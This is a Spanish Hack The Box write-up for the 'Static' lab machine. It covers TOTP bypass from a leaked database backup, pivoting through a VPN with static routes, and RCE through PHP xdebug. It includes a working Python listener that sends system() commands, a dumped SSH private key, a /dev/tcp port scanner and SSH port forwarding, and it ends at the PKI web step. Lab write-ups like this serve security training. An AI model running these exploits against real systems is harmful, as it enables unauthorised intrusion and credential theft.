---
layout: post
title: Static - Writeup
permalink: /htb/static
tags: [Path Hijacking, Port Forwarding, CVE, Pivoting, PHP, Real, Hard, Linux, Hackthebox]
description: Máquina Linux de dificultad Hard con mucho Pivoting, explotación Web y, para concluir, un Path Hijacking. 
categories: [Linux, Ciberseguridad, Hacking, Redes]
---

![La imagen no ha podido ser cargada. Pls recarga la pagina!](/img/static/static.png)

Máquina Linux de dificultad Hard donde nos encontraremos con un panel de inicio de sesión donde se nos pedirá una autentificación en dos pasos (2FA), nos conectaremos una VPN donde tendremos que ir saltando entre los diferentes equipos y segmentos de esta red interna.

Tendremos que añadir una ruta a nuestra tabla de rutas para poder ver unos equipos bastante interesantes, donde podremos explotar una vulnerabilidad en un módulo de PHP para conseguir RCE. Luego de esto, y de obtener la clave privada del usuario www-data para conectarnos por SSH, podremos acceder al equipo llamado PKI, en el que corre un servicio web que tendremos que explotar para conseguir un RCE algo incómodo, pero útil. Tras eso, nos mandaremos una Reverse Shell con Python.

Una vez obtengamos la Shell, encontraremos un binario con una capability que, en resumen, nos permite cambiar el UID al del usuario root (0) mientras se está ejecutando. Gracias a pspy, podremos ver que se ejecuta un binario de manera insegura, ya que no se le está llamando por su ruta absoluta, sino que se está ejecutando directamente con el nombre de este (Buscando su ruta en la variable $PATH). Gracias a esto, podremos efectuar un Path Hijacking, darle permisos SUID a /bin/bash y convertirnos al fin en el usuario root.

<br>

# **Vamos a ello**

## **Índice**
- [**Fase de reconocimiento**](#1)
  - [Escaneo de puertos con Nmap](#2)
- [**Enumeración**](#3)
  - [Enumerando el servicio Web que corre en el puerto 8080](#4)
  - [Arreglando un archivo .gz corrupto](#5)
  - [Generando un código OTP para entrar como administrador](#6)
  - [Conectándonos a la Red Privada de la "empresa"](#7)
  - [Añadiendo la ruta del segmento donde se encuentra la Web y la DB a nuestra tabla de rutas](#8)
  - [Enumerando los servicios que corren en los equipos "db" y "web"](#9)
  - [Enumerando la Web del equipo 172.20.0.10](#10)
- [**Explotación**](#11)
  - [Obteniendo Ejecución Remota de Comandos a través del módulo `xdebug` de PHP](#12)
  - [Obteniendo la clave privada de SSH del usuario www-data en el equipo "web"](#13)
- [**De www-data (web) a www-data (pki)**](#14)
  - [Encontramos un servicio web que corre en el equipo "pki"](#15)
  - [Haciendo un Port Forwarding al puerto 80 del equipo "PKI" a través de SSH](#16)
  - [Obteniendo RCE en el equipo "PKI"](#17)
  - [Obteniendo una Reverse Shell en el equipo PKI](#18)
- [**Escalando privilegios en el equipo "PKI"**](#19)
  - [Investigando el Binario ersatool](#20)
  - [Explotando un Path Hijacking para poder convertirnos en root](#21)
- [**Mi opinión sobre la máquina**](#22)

<br>

## **Fase de reconocimiento** <a id=1></a>

Antes de empezar, por comodidad, añadimos el dominio `static.htb` al archivo `/etc/hosts`.

### Escaneo de puertos con Nmap<a id=2></a>

Primero vamos a ver los puertos abiertos y lo que corre en estos:

```bash
$ nmap -p- --open -n -vvv --min-rate 5000 -Pn static.htb -oG ports
```

Usando la herramienta **Extractports**, nos copiamos los puertos abiertos para luego escanear el servicio que corre en cada uno de ellos:

```bash
$ extractPorts ports
...

$ nmap -p22,2222,8080 -sCV -n static.htb -oN s
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)
|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)
|_  256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-robots.txt: 2 disallowed entries 
|_/vpn/ /.ftp_uploads/
...
```

Podemos encontrar tres puertos abiertos con los siguientes servicios:

| Puerto | Servicio |
| ------ | -------- |
| 22     |      SSH |
| 2222   |      SSH |
| 8080   | HTTP. Se nos listan dos rutas: `/vpn/` y `/.ftp_uploads/` gracias al archivo `robots.txt` |

<br>

## **Enumeración**<a id=3></a>

### Enumerando el servicio Web que corre en el puerto 8080<a id=4></a>

Al entrar a la Web, parece desierta, pero si recordamos antes, tenemos dos rutas (`/vpn/` y `/.ftp_uploads/`). Vamos a echarle un ojo:


En la ruta `/.ftp_uploads/` se nos listan dos archivos:

- Lo que parece un backup de base de datos.
- Un archivo `.txt` que nos advierte de lo siguiente:
    "Binary files are being corrupted during transfer!!! Check if are recoverable."
    > Los binarios se han corrompido durante la transferencia!!! Intenta recuperarlos.

Vamos a hacerle caso e intentar recuperar su contenido, pero antes, veamos la otra ruta, la `/vpn/`:

Nos encontramos un panel de inicio de sesión donde, si probamos las credenciales más comunes, vemos que `admin:admin` son válidas, no obstante se nos pide un código `OTP`.

> Una `OTP` (`One Time Password`) es una contraseña de un solo uso que se usa como `2FA` (`Two Factor Auth`). > Existen dos tipos de `OTP`:
> - TOTP: Basada en tiempo (Es lo que se utiliza cuando activas la verificación en dos pasos en aplicaciones como Discord o Twitch). Cambia cada x segundos
> - HOTP: Basada en Hash (Cada vez que se solicita el código, se genera a partir de una clave privada y un contador. Si se vuelve a solicitar, este cambia).
> Más información acerca de sus diferencias en [https://www.onelogin.com/learn/otp-totp-hotp](https://www.onelogin.com/learn/otp-totp-hotp)

De momento, aquí no podemos hacer nada, así que vamos a ver el archivo corrupto.

### Arreglando un archivo .gz corrupto<a id=5></a>

Si intentamos descomprimir este archivo, pasa lo siguiente:

```bash
$ gzip -d ./db.sql.gz

gzip: ./db.sql.gz: invalid compressed data--crc error

gzip: ./db.sql.gz: invalid compressed data--length error
```

Si Gugleamos este error, podemos encontrar que existe una herramienta que **puede** solucionar este error llamada [fixgz](https://github.com/yonjar/fixgz):

Nos clonamos el repo:

```bash
$ git clone https://github.com/yonjar/fixgz.git
...
$ cd fixgz
```

Compilamos esto:

```bash
$ c++ ./fixgz.cpp

$ mv a.out fixgz
```

E intentamos recuperar el fichero:

```bash
$ ./fixgz ../db.sql.gz ../r.sql.gz
...
$ cd ..
```

E intentamos descomprimirlo y ejecutarlo:

```bash
$ gzip -d ./r.sql.gz
...

$ cat r.sql

CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) ); 
INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );
```

Bien, podemos ver un backup de la tabla `users`, en la base de datos `static`. Vemos que el usuario es `admin` y la password es también `admin`, pero hasheada, cosa que ya sabíamos. También vemos una clave `TOTP` (`Time One Time Password`. La que se basa en tiempo). Vamos a tratar de generarnos un código de autentificación con esta clave.

### Generando un código OTP para entrar como administrador<a id=6></a>

Para generar los códigos existen varias alternativas, yo usare la extensión `Authenticator` de Chrome (También existe su versión para Firefox). 

Abrimos el panel de la extensión, le damos a **Añadir**, introducimos el código `TOTP` y le damos a **Crear**.

Si probamos los códigos que se nos van generando, es probable que no funcionen. Esto puede tratarse a que la hora de la máquina es diferente a la nuestra, así que, si investigamos un poco, podemos averiguar que existe un servicio llamado NTP (`Network Time Protocol`), que, en caso de que estuviese abierto en la máquina, podemos sincronizar la hora de la máquina con la nuestra y poder generar el token correcto. El servicio por defecto usa el puerto 123 por **UDP**, vamos a verificarlo usando de nuevo **Nmap**:

```bash
$ nmap -p123 -sU -sCV static.htb
...
PORT    STATE SERVICE VERSION
123/udp open  ntp     NTP v4 (unsynchronized)
| ntp-info: 
|_  

Host script results:
|_clock-skew: 16m24s
...
```
Al parecer el servicio está activo y la máquina va adelantada un ratito a la nuestra...

Para obtener la hora exacta, podemos usar este Script en Python:

```python
import ntplib
from datetime import datetime, timezone

c = ntplib.NTPClient()

# Provide the respective ntp server ip in below function
response = c.request('static.htb', version=3)
response.offset

print (datetime.fromtimestamp(response.tx_time, timezone.utc))
```

Y... Vemos que efectivamente, la hora está adelantada por al rededor de 16 minutos.

Pues, si buscamos un poco, podemos ver que podemos usar la librería `pyotp` de python para generar los códigos.

Vamos a investigar si podemos pasarle el tiempo de la máquina para obtener un código valido:

...

Al parecer si, vamos a modificar el script usado anteriormente para poder generar un código válido:

```python
import ntplib
from datetime import datetime, timezone
import pyotp

c = ntplib.NTPClient()

# Provide the respective ntp server ip in below function
r = c.request('static.htb', version=3)

code = pyotp.TOTP("orxxi4c7orxwwzlo")

print("[+] Current Code --> " + code.at(r.tx_time))
```

```bash
$ python3 codes.py

[+] Current Code --> 064240
```

Introducimos el código en la Web...

Y...

Tamos dentro!!!!!

![La imagen no ha podido ser cargada. Pls recarga la pagina!](/img/static/vpn.png)

### Conectandonos a la Red Privada de la "empresa"<a id=7></a>

Una vez dentro, se nos listan lo que parecen varios equipos dentro de la red, cada uno parece estar dedicado a un servicio en específico. A simple vista llama la atención el equipo `PKI`, ya que su **dirección IP** es diferente a la de los demás equipos (`192.168.254.3`). En la parte superior tenemos un campo donde si ponemos cualquier cosa, nos descarga un archivo `.ovpn` (Tipo de archivo de configuración de `OpenVPN`, lo que usamos para conectarnos a la VPN de HackTheBox, no tiene mayor misterio 😆). Vamos a abrirlo a ver que tiene por dentro:

```bash
client
dev tun9
proto udp
remote vpn.static.htb 1194
resolv-retry infinite
nobind
user nobody
group nogroup
persist-key
persist-tun

remote-cert-tls server

cipher AES-256-CBC
#auth SHA256
key-direction 1
verb 3
<ca>
-----BEGIN CERTIFICATE-----
...
-----END CERTIFICATE-----
</ca>
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            23:e4:0e:74:b5:e9:b2:eb:44:2a:35:54:72:4a:0b:66
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=static-gw
        Validity
            Not Before: Dec 18 18:32:43 2021 GMT
            Not After : Nov 24 18:32:43 2121 GMT
        Subject: CN=pki
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:c1:af:10:df:bb:bf:00:ed:11:5a:eb:f5:5a:54:
                    f8:50:8e:a6:ce:dd:2c:3f:88:19:62:c1:b2:b6:70:
                    d6:3c:91:af:7c:8d:55:90:8d:19:cc:e7:8f:6c:67:
                    94:24:3f:26:eb:2b:32:90:21:30:f2:0b:86:42:b0:
                    33:c2:3c:b9:52:3f:93:a0:bd:b1:52:27:01:8c:a4:
                    35:1c:ce:2b:69:c5:73:b7:c2:76:0d:1c:b7:ac:e6:
                    95:be:3d:f5:3c:ee:a8:23:68:ab:5b:6e:bb:f7:fe:
                    64:ae:b4:42:0c:97:f4:fc:9a:28:20:ab:2b:16:84:
                    a7:52:23:77:4b:1c:0f:a4:05:68:e1:d0:1a:55:26:
                    f4:b6:54:32:82:9a:d4:db:eb:72:c4:be:ec:d5:a1:
                    9a:27:53:91:cd:57:16:95:d2:32:8e:5d:b3:80:95:
                    3d:e4:69:77:0f:cd:a2:fe:d4:45:c4:4a:86:e8:e0:
                    f3:e5:ac:ac:fb:64:4b:3d:17:ab:b3:6f:28:ad:26:
                    32:0e:0b:29:eb:38:26:69:a3:d7:52:d1:81:7d:f5:
                    e0:fe:59:4e:73:2e:2c:d7:ff:16:0c:bb:23:79:bf:
                    91:0d:0b:3a:87:77:84:d7:51:ab:ca:4b:de:6a:b2:
                    82:2b:8d:95:0d:47:1b:78:e4:a6:a6:0e:38:34:d6:
                    92:d7
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Subject Key Identifier: 
                90:0E:B2:B2:FC:69:88:A5:79:D6:73:8D:50:00:93:06:6E:6C:1A:36
            X509v3 Authority Key Identifier: 
                keyid:A1:DA:83:60:32:81:7F:1B:80:19:E0:20:2D:D6:60:C8:A5:ED:82:54
                DirName:/CN=static-gw
                serial:47:E9:98:AD:71:C9:39:15:78:B5:B8:3C:D6:C4:12:ED:17:E3:60:AE

            X509v3 Extended Key Usage: 
                TLS Web Client Authentication
            X509v3 Key Usage: 
                Digital Signature
    Signature Algorithm: sha256WithRSAEncryption
         0b:37:c4:bc:05:c7:2c:03:ca:d8:07:a2:d1:8a:4b:f2:12:21:
         ef:dc:12:e7:ad:3f:01:66:fe:20:8b:e6:58:98:d6:fe:4c:e6:
         90:3a:5b:bf:7f:16:f1:b1:27:52:53:a3:f4:d8:3a:1c:b7:63:
         47:c0:7e:b1:de:b9:eb:5b:23:49:87:56:d9:d4:4c:38:68:83:
         82:bb:1a:a3:05:01:89:64:16:87:20:5c:fd:19:70:e9:d4:6b:
         4f:2e:a1:79:36:40:57:48:34:10:5c:c3:f9:dc:69:fb:dc:98:
         65:39:c6:e8:3d:00:5d:bb:ec:e1:67:59:eb:26:1a:f6:ec:1a:
         4d:70:7b:a1:34:91:76:3c:c5:a6:c5:c3:8f:59:22:ba:2b:8f:
         a0:4a:3c:4b:59:b0:f0:50:4c:4c:8d:9c:27:29:4e:6c:a7:2e:
         65:93:a5:8e:6f:1a:a4:50:a0:86:d2:77:0f:96:52:31:3a:14:
         0c:f4:5a:6c:98:bc:eb:75:8f:b1:aa:47:9d:af:f2:c1:7c:30:
         c2:59:03:50:97:17:d7:c0:f2:5f:03:a5:57:09:f2:cd:c7:ce:
         a9:9e:45:c7:00:53:af:d0:34:44:72:7a:7d:14:6c:40:57:a0:
         4c:83:67:14:e4:8c:8f:73:04:c7:ca:d8:e0:67:cd:cd:e2:89:
         f2:8a:5a:c1
-----BEGIN CERTIFICATE-----
...
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
...
-----END PRIVATE KEY-----
</key>
key-direction 1
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
..
-----END OpenVPN Static key V1-----
</tls-auth>

```

Parece un archivo `.ovpn` normal al que nos podemos conectar... Pero antes, podemos ver que el archivo se conecta a `vpn.static.htb`, por lo tanto, hay que añadirlo al `/etc/hosts` para que resuelva bien!

...

Una vez añadido, vamos a conectarnos:
```bash
$ openvpn pki.ovpn
```

Si ejecutamos `$ ifconfig`, podremos ver que estamos conectados a una nueva interfaz llamada `tun9` (La de HTB el `tun0`). En mi caso, con la IP `172.30.0.9` (IP de clase B. Las IP de clase B se suelen utilizar en redes de mediano tamaña. Estas son: 172.xxx.xxx.xxx). 

Vamos a comprobar los equipos que podemos ver (En base a lo que se nos lista en la Web) mediante un simple `ping`.

...

Vemos que solo tenemos visibilidad con el equipo llamado `vpn`, vamos a escanear sus puertos con Nmap:

```bash
$ nmap -p- --open -n -vvv --min-rate 5000 -Pn 172.30.0.1 
...
$ nmap -p22,2222 -sCV 172.30.0.1
...
PORT     STATE SERVICE VERSION                                                                                                        
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)
|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)
|_  256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
...
```

Dos servicios SSH, si intentamos conectarnos como root (Por los loles), vemos que nada. 

### Añadiendo la ruta del segmento donde se encuentra la Web y la DB a nuestra tabla de rutas<a id=8></a>

Tras buscar un poco acerca de las rutas **estaticas** (Pista del nombre de la máquina -- Gracias HTB --) y de como podemos tratar de añadirnoslas a nuestra **tabla de rutas** con tal de poder tener visibilidad con los equipos que pertenezcan a este, pude encontrar [esta](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/s1-networkscripts-static-routes) documentación acerca del comando `ip`. 

Vemos que el comando `$ ip route` nos muestra nuestras rutas (y más cositas medio avanzadas). Vamos a intentar añadir la ruta del segmento en cuestión usando los comandos que encontré en [este articulo](https://devconnected.com/how-to-add-route-on-linux/):

> ip route add \<network_ip\>/\<cidr\> dev \<network_card_name\>
> <network_ip\><cidr\> -> 172.20.0.0/24 
> <network_card_name\> --> tun9

```bash
$ ip route add 172.20.0.0/16 dev tun9
```

Si ahora intentamos un `$ ping` contra la `172.20.0.10`, vemos que nos responde. Lo mismo con la `172.20.0.11`!

Vamos a ver los puertos de estos dos equipos...

### Enumerando los servicios que corren en los equipos "db" y "web"<a id=9></a>

Vamos a usar Nmap (Como de costumbre...):

```bash
$ nmap -p- --open -n -vvv --min-rate 5000 -Pn 172.20.0.10 172.20.0.1
...
PORT     STATE SERVICE REASON
3306/tcp open  mysql   syn-ack ttl 6
...
PORT   STATE SERVICE REASON                                        
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
...
```

Nada más lejos de lo que sus respectivos nombres indican...

Para conectarnos al servidor MySQL, necesitamos user y pass, así que de momento nos olvidamos.

Vamos a ver la Web...

### Enumerando la Web del equipo 172.20.0.10<a id=10></a>

Vamos a entrar desde el navegador:

![La imagen no ha podido ser cargada. Pls recarga la pagina!](/img/static/primeraweb.png)

Podemos encontrar dos rutas:

- VPN: Es exactamente lo mismo que hemos visto antes
- info.php: Es el archivo de información de PHP donde se indican un porrón de versiones y de módulos/extensiones que se están usando.

Vamos a investigar este archivo:

...

Si vamos bajando, podremos ver algunos módulos interesantes, en especial, uno llamado `xdebug v2.6.0`. Vamos a buscar acerca de este:

...

Aparte de encontrar sploits de Metasploit (._.), podemos encontrar un [repo en Github](https://github.com/nqxcode/xdebug-exploit) con un exploit para este módulo.

> Lo que hace el módulo `xdebug` es lo siguiente:
> Si le pasamos el parámetro GET `?XDEBUG_SESSION_START=cualquiercosa`, este abrirá una conexión por el puerto 9000 contra nuestra IP la cual nos permitira ejecutar cierto código PHP. Gracias a este exploit, podremos ejecutar comandos a nivel de Sistema. 

<br>

## **Explotación**<a id=11></a>

### Obteniendo Ejecución Remota de Comandos a través del módulo  `xdebug` de PHP<a id=12></a>

He modificado un poco el exploit para que sea más cómodo de utilizar y se parezca más a una Shell:

```python
import socket 
import os
import base64

ip_port = ('0.0.0.0', 9000) 
sk = socket.socket()
sk.bind(ip_port) 
sk.listen(10) 
conn, addr = sk.accept() 

while  True: 
    client_data = conn.recv(1024)

    client_data = str(client_data)

    client_data = client_data.split("CDATA")[1].split("[")[1].split("]")[0]
    if client_data: os.system("echo " + client_data + "|base64 -d 2>/dev/null && echo") # Tambien se podria hacer con la funcion de bas64

    data = "system('" + input('>> ') + "')"

    data = data.encode("ascii")
    data = base64.b64encode(data)
    conn.sendall('eval -i 1 -- %s\x00'.encode("ascii") % data)
```

Una vez estemos en escucha, lanzamos la petición desde `curl` o Navegador contra `http://172.20.0.10/info.php?XDEBUG_SESSION_START=cualquiercosa` y obtendremos la conexión. Si escribimos cualquier comando, este debería ejecutarse! La única limitación es que en el script solo podremos ver la última línea del output de cada comando, pero hay una forma de poder verlo. Simplemente, escribimos el comando, paramos el script (`CTRL + C`) y miramos en la consola donde hemos lanzado la petición (Para esto, si es necesario enviar la petición con CURL), al principio de este estará el resultado completo del comando. 

> Es un metodo un poco cutre, pero sirve 🙂

Vamos a ello!

### Obteniendo la clave privada de SSH del usuario www-data en el equipo "web"<a id=13></a>

Vamos a enumerar un poco el Sistema:

```
>> cat /etc/passwd
```

> Para ver el contenido del archivo, hacemos lo anteriormente dicho!

```bash
root:x:0:0:root:/root:/bin/bash  <-----------------------------------------
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/home/www-data:/bin/bash  <-----------------------------------------
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
```

Como podemos ver, usuarios con una bash (Usuarios a los que podemos acceder) solo existen 2: root y `www-data` (Lo que ahora somos). Y también es interesante fijarnos en que `www-data`  tiene un directorio personal, `/home/www-data/`. Vamos a listar su contenido:

Ejecutamos el sploit de nuevo...

```
>> ls -la /home/www-data
drwx------ 2 www-data www-data 4096 Jun 14  2021 .ssh
```

Por lo poco que podemos ver del output del comando, existe un directorio `.ssh`, vamos a ver si existe una `id_rsa` con la cual nos podamos autentificar por SSH...

```
>> ls -la /home/www-data/.ssh/id_rsa
-rw------- 1 www-data www-data 1675 Jun 14  2021 /home/www-data/.ssh/id_rsa
```

Vemos que existe! Vamos a hacer lo mismo que con el `/etc/passwd`.

```
>> cat /home/www-data/.ssh/id_rsa
-----END RSA PRIVATE KEY-----
```

> Efectuamos la chapuza 😛

Y...

...

```bash
-----BEGIN RSA PRIVATE KEY-----
mIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/
nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ
QEHYKteL1D+hJ80NDd7fJTtQgzT4yBDwrVKwIUSETMfWgzJ5z24LN5s/rcQYgl3i
vKmls3lsod8ilakdDoYEYt12L4ST/exEoVl0AyD9y8m651q40k1Gz4WzPnaHAlnj
mL6CANfiNAJoc8WnqZN5ruSrWhmivmDbKLlDCO5bCCzi2zMHJKqQkcBxdWk60Qhi
17UJMV3mKVQRprvpeTR2jCMykH81n2KU46doSQIDAQABAoIBAADCHxWtkOhW2uQA
cw2T91N3I86QJLiljb8rw8sj17nz4kOAUyhTKbdQ102pcWkqdCcCuA6TrYhkmMjl
pXvxXAvJKXD3dkZeTNohEL4Dz8mSjuJqPi9JDWo6FHrTL9Vg26ctIkiUChou2qZ9
ySAWqCO2h3NvVMpsKBwjHU858+TASlo4j03FJOdmROmUelcqmRimWxgneHBAHEZJ
GqDuPjmPmw7pbThqlETyosrbaB3rROzUp9CKAHzYB1BvOTImDsb6qQ+GdKwewAQf
j60myPuxl4qgY8O2yqLFUH3/ovtPTKqHJSUFBO23wzS1qPLupzu1GVXwlsdlhRWA
Amvx+AECgYEA6OOd9dgqXR/vBaxDngWB6ToVysWDjO+QsjO4OpFo7AvGhMRR+WpK
qbZyJG1iQB0nlAHgYHEFj4It9iI6NCdTkKyg2UzZJMKJgErfgI0Svkh/Kdls23Ny
gxpacxW3d2RlyAv4m2hG4n82+DsoPcN+6KxqGRQxWywXtsBsYkRb+wkCgYEA53jg
+1CfGEH/N2TptK2CCUGB28X1eL0wDs83RsU7Nbz2ASVQj8K0MlVzR9CRCY5y6jcq
te1YYDiuFvT+17ENSe5fDtNiF1LEDfp45K6s4YU79DMp6Ot84c2fBDIh8ogH0D7C
CFdjXCI3SIlvc8miyivjRHoyJYJz/cO94DsTE0ECgYA1HlWVEWz4OKRoAtaZYGA1
Ng5qZYqPxsSWIL3QfgIUdMse1ThtTxUgiICYVmqmfP/d/l+TH7RI+0RIc54a7y1c
PkOhzKlqfQSnwmwgAg1YYWi/vtvZYgeoZ4Zh4X4rOTcN3c0ihTJFzwZWsAeJruFv
aIP6nGR1iyUNhe4yq6zfIQKBgANYQNAA2zurgHeZcrMUqsNdefXmB2UGPtKH9gGE
yhU9tMRReLeLFbWAfJj2D5J2x3xQ7cIROuyxBPr58VDGky2VTzRUo584p/KXwvVy
/LaJiVM/BgUCmhxdL0YNP2ZUxuAgeAdM0/e52time8DNkhefyLntlhnqp6hsEqtR
zzXBAoGBANB6Wdk/X3riJ50Bia9Ai7/rdXUpAa2B4pXARnP1/tw7krfPM/SCMABe
sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+
s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gaU
-----END RSA PRIVATE KEY-----
```

> Nota mental: Si la `id_rsa` tiene un espacio de más en cualquier sitio, esta no funcionará (SSH es muy estricto con esto 🤔). Por lo tanto, si al copiarla de la terminal se quedan espacios sueltos, habrá que quitarselos manualmente (O buscar una web que lo haga automaticamente, pero yo no he conseguido que me funcionen con este tema).

Parece que ya la tenemos...

Ahora, nos creamos en nuestra máquina local un archivo `id_rsa`, le damos permisos `600` `$ chmod 600 id_rsa` y nos conectamos usandola como archivo de identificación (Parámetro `-i`):

```bash
$ ssh www-data@172.20.0.10 -i id_rsa
```

Y... Tamos dentro!

<br>

## **De www-data (web) a www-data (pki)**<a id=14></a>

Antes de seguir dando saltos, si vamos al directorio `/home/`, podremos encontrar la 🚩 flag de User 🚩.

> Un poco raro esto... jejeje

### Encontramos un servicio web que corre en el equipo "pki"<a id=15></a>

Primero vamosa a ver quien somos:

```bash
$ hostname -I
172.20.0.10 192.168.254.2 
```

Vemos que efectivamente estamos en el equipos "web", pero, ahora pertenecemos al mismo segmento que el equipo `pki` (192.168.254). Vamos a comprobar si tenemos conectividad con esta...

```bash
$ ping -c 1 192.168.254.3
PING 192.168.254.3 (192.168.254.3) 56(84) bytes of data.
64 bytes from 192.168.254.3: icmp_seq=1 ttl=64 time=0.092 ms

--- 192.168.254.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.092/0.092/0.092/0.000 ms
```

Pues si, vemos al equipo `pki`!

Vamos a escanear los primeros 10000 puertos del equipo...

Para ello, podriamos cargar un binario sin dependencias de Nmap, o montar nuestro propio Script en Bash. En mi caso, usaré un Script en Bash:

```bash
#!/bin/bash

hosts=("192.168.254.2")

for host in ${hosts[@]};do
  echo "[+] Enumerando los puertos del host $host"
  for i in $(seq 1 10000);do
    timeout 1 bash -c "echo '' > /dev/tcp/$host/$i" 2>/dev/null && echo -e "\t[*] Puerto $i ABIERTO" &
  done
done
```

Antes de nada, para transferir el archivo, nos creamos un servidor http en python:

```bash
$ python3 -m http.server 80
...
```

Y lo descargamos en la máquina victima:

```bash
$ wget 172.30.0.9/ports.sh
```

También, ya de paso, podemos transferirnos el `NetCat` para usarlo más adelante:

Lo descargamos y hacemos lo mismo...

```bash
$ wget 172.30.0.9/ncat
```

Una vez hecho esto, vamos a empezar con el escaneo...

```bash
$ chmod +x ./ports.sh
$ ./ports.sh
[+] Enumerando los puertos del host 192.168.254.2
        [*] Puerto 22 ABIERTO
        [*] Puerto 80 ABIERTO
```

Vale, podemos ver que hay lo que intuimos que es una Web (Puerto 80 default) y un servicio SSH (Puerto 22 default)

comprobémoslo...

```bash
$ wget -qO- http://192.168.254.3
...
```

Al parecer esto responde. Vamos a investigarlo más a fondo, para ello, toca hacer un **Port Forwarding**.

### Haciendo un Port Forwarding al puerto 80 del equipo "PKI" a través de SSH<a id=16></a>

> El **Port Forwarding** es un método que se utilizar para, en resumidas cuentas, el tráfico que viaje por un puerto en específico de nuestra máquina, será redirigido al de la máquina victima. Esto sería como hacer un tunel entre nuestro puerto y el de la máquina. Hay diferentes maneras de hacer un **Port Forwarding**: SSH, Chisel, etcétera.

En nuestro caso, vamos a hacerlo con SSH (Aprovechando que podemos conectarnos con este servicio 😁). No es nada dificil, simplemente cerramos la sesión que tengamos activa por SSH `$ exit` y añadimos el parámetro `-L PuertoLocal:host:PuertoHost` al comando usado para conectarnos, con tal de que quede de la siguiente forma:

```bash
$ ssh www-data@172.20.0.10 -i id_rsa -L 80:192.168.254.3:80
```

Ahora, si vamos a nuestro navegador y entramos a nuestro `localhost`, tendriamos que ser capaces de ver la Web del equipo `PKI`.

### Obteniendo RCE en el equipo "PKI"<a id=17></a>

Vamos a enumerar un poco la Web:

![La imagen no ha podido ser cargada. Pls recarga la pagina!](/img/static/webbinario.png)

